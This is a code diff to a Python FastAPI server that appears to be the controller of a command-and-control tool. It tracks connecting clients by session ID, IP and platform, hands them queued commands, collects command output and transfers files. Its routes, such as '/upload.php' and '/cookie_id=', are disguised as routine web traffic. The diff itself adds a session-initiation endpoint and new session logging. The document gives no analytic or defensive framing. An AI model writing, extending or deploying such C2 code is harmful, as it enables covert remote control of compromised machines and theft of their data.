@@ -85,10 +85,10 @@ def handle_down_arrow():
         readline.set_startup_hook(lambda: readline.insert_text(CMD_HISTORY[HISTORY_INDEX]))
         readline.redisplay()
     
-def checkIfNewClient(client):
+def checkIfNewClient(client, sessionID, platform):
     if (client not in clients) and (global_lock == False):
         clients.append(client)
-        print(f"New connection from: {client}")
+        print(f"\nNew session: {sessionID} - IP: {client}, Platform: {platform}\n")
         global global_connection
         global_connection = True
 
@@ -106,6 +106,14 @@ async def upload_file(file: str, request: Request):
     data = encodeFile(file)
     return data
 
+@app.get("/cookie_id={sessioninfo:path}", response_class=PlainTextResponse)
+async def session_initiate(sessioninfo: str, request: Request):
+    client = getIP(request)
+    sessionid = sessioninfo.split(',')[0]
+    platform = sessioninfo.split(',')[1]
+    checkIfNewClient(client, sessionid, platform)
+    return "Connection Initiated"
+
 @app.post("/upload.php/{file:path}")
 async def download_file(file: str, request: Request):
     data: dict = await request.json()
@@ -116,7 +124,6 @@ async def download_file(file: str, request: Request):
 async def get_command(path: str, request: Request):
 
     client = getIP(request)
-    checkIfNewClient(client)
 
     if path in cmdRequests: 
         if len(CMD_QUEUE) == 0:
@@ -130,8 +137,12 @@ async def get_command(path: str, request: Request):
 async def send_output(path: str, request: Request):
     if path in outputRequests:
         data: dict = await request.json()
-        fancyprint("Output:")
-        fancyprint(data["result"])
+        if "Session:" in data["result"]:
+            sessionid = data["result"].lstrip("Session:")
+            print(f"\nSessionID: {sessionid}")
+        else:
+            fancyprint("Output:")
+            fancyprint(data["result"])
 
 def encodeFile(filePath):
     with open(filePath, 'rb') as file:
@@ -223,6 +234,8 @@ def input_thread():
 
     global global_connection
     global HISTORY_INDEX
+
+    print("Waiting for client...")
 
     while True:
         new_cmd = ""
